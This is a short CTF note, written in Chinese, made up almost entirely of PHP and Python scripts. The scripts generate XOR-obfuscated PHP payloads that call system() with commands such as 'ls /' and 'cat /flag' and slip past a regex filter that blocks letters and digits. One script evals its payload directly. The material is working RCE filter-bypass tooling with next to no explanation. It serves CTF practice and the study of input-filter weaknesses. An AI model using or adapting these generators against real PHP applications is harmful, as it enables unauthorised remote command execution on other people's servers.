---
创建: 2025-09-10
tags:
  - CTF/脚本/RCE异或绕过
---

```php
<?php
class Xor_transfer {
  // 不匹配的正则表达式
  var $pattern = '/[0-9A-Za-z]/';
  // 需要转换的函数名
  var $func_name = 'system';
  // 需要转换的函数参数
  var $args = ['ls /'];
  // 是否需要引号
  var $quote = '\'';
  // 生成的字典
  var $dict;
  // 开启变量替换
  var $val_replace = true;
  // 对每一个字符都进行异或转换
  var $alone_ch_xor = false;

  function __construct() {
    function gen_dict($pattern) {
      // 根据传入的不匹配正则表达式生成字典
      $dict = [];
      for ($i = 0; $i <= 127; $i++) {
        if (!preg_match($pattern, chr($i))) {
          array_push($dict, chr($i));
        }
      }
      return $dict;
    }

    $this->dict = gen_dict($this->pattern);
  }

  // 对于 $this->alone_ch_xor = true 把单独的一个字符转换成两个不可见字符异或形式，例如 's' -> ("%7B"^"%08")
  // 否则，返回转换后的关联数组，如 's' -> ["xor_ed" => "%7B", "secret" => "%08]
  function ch_xor_transfer($ch) {
    // 把一个可见字符转换成两个不可见字符异或形式，成功返回结果，失败返回 false
    $dict = $this->dict;
    foreach ($dict as $secret) {
      $xor_ed = $ch ^ $secret;
      if (in_array($xor_ed, $dict)) {
        if ($this->alone_ch_xor) {
          $xor_ed = urlencode($xor_ed);
          $secret = urlencode($secret);
          $quote = $this->quote;
          return '(' . $quote . $xor_ed . $quote . '^' . $quote . $secret . $quote . ')';
        }
        return ["xor_ed" => $xor_ed, "secret" => $secret];
      }
    }
    return false;
  }

  function str_xor_transfer($str) {
    $str_xor_ed = '';
    $secret_str = '';

    $str_len = strlen($str);
    for ($i = 0; $i < $str_len; $i++) {
      $ch_xor_ed = $this->ch_xor_transfer($str[$i]);
      if ($ch_xor_ed !== false && is_array($ch_xor_ed)) {
        $str_xor_ed .= $ch_xor_ed['xor_ed'];
        $secret_str .= $ch_xor_ed['secret'];
      } else {
        throw new Exception("无法对字符 '{$str[$i]}' 进行异或转换");
      }
    }

    $str_xor_ed = urlencode($str_xor_ed);
    $secret_str = urlencode($secret_str);

    return $this->quote . $str_xor_ed . $this->quote . '^' . $this->quote . $secret_str . $this->quote;
  }

  function multi_str_xor($arr) {
    $res_arr = [];

    foreach ($arr as $str) {
      $res = '';

      $str_len = strlen($str);

      if ($this->alone_ch_xor)
        for ($i = 0; $i < $str_len; $i++) {
          $ch = $str[$i];
          $ch_xor_ed = $this->ch_xor_transfer($ch);

          $dot = $i == 0 ? '' : '.';
          if ($ch_xor_ed !== false) {
            $res .= $dot . $ch_xor_ed;
          } else {
            throw new Exception("无法对字符 '{$ch}' 进行异或转换");
          }
        }
      else
        $res = $this->str_xor_transfer($str);

      $res_arr[] = $res;
    }

    return $res_arr;
  }

  function gen_payload() {
    $res = '';

    $res_arr = $this->multi_str_xor(array_merge([$this->func_name], $this->args));

    $func = $res_arr[0];
    $res_arr_len = count($res_arr);

    if ($this->val_replace) {
      $func_val = '$_=' . $func . ';';
      $res .= $func_val;

      $val = [];

      for ($i = 1; $i < $res_arr_len; $i++) {
        $val_name = '$_';
        for ($j = 0; $j < $i; $j++) {
          $val_name = $val_name . '_';
        }
        $arg_val = $val_name . '=' . $res_arr[$i] . ';';
        $val[] = $val_name;
        $res .= $arg_val;
      }

      $res .= '$_(';
      for ($i = 0; $i < $res_arr_len - 1; $i++) {
        $dou = $i == $res_arr_len - 2 ? '' : ',';
        $res .= $val[$i] . $dou;
      }
      $res .= ');';

      return $res;
    }

    $res .= '(' . $func . ')(';

    for ($i = 1; $i < $res_arr_len; $i++) {
      $dou = $i == $res_arr_len - 1 ? '' : ',';
      $res .= $res_arr[$i] . $dou;
    }
    $res .= ');';

    return $res;
  }
}

$xor_transfer = new Xor_transfer();
echo $xor_transfer->gen_payload();
```

^e9b5a7

```php
<?php
function enc($code, &$res, &$keys) {
  for ($i = 0, $j = 0; $i < strlen($code);) {
    $key = chr(($j++) % 48);
    $ch = $code[$i] ^ $key;
    if (!preg_match("/[A-Za-z0-9]+/i", $ch)) {
      $res = $res . $ch;
      $keys = $keys . $key;
      $i++;
    }
  }
  $res = urlencode($res);
  $keys = urlencode($keys);
}

$_system = 'system';
$_cmd = 'cat /flag';

$__system = '';
$__system_keys = '';
enc($_system, $__system, $__system_keys);
$__cmd = '';
$__cmd_keys = '';
enc($_cmd, $__cmd, $__cmd_keys);

$payload =  '("' . $__system . '"^"' . $__system_keys . '")("' . $__cmd . '"^"' . $__cmd_keys . '");';

echo $payload;

eval(urldecode($payload));
```

```python
import re

preg = '[a-z]|[0-9]|[A-Z]'

def convertToURL(s):
    if s < 16:
        return '%0' + str(hex(s).replace('0x', ''))
    else:
        return '%' + str(hex(s).replace('0x', ''))

def generateDicts():
    dicts = {}
    for i in range(256):
        for j in range(256):
            if not re.match(preg, chr(i), re.I) and not re.match(preg, chr(j), re.I):
                k = i ^ j
                if k in range(32, 127):
                    if not k in dicts.keys():
                        dicts[chr(k)] = [convertToURL(i), convertToURL(j)]
    return dicts

def generatePayload(dicts, payload):
    s1 = ''
    s2 = ''
    for s in payload:
        s1 += dicts[s][0]
        s2 += dicts[s][1]
    return f'("{s1}"^"{s2}")'

dicts = generateDicts()
a = generatePayload(dicts, 'system')
b = generatePayload(dicts, 'cat flag.php')
print(a + b + ';')
```
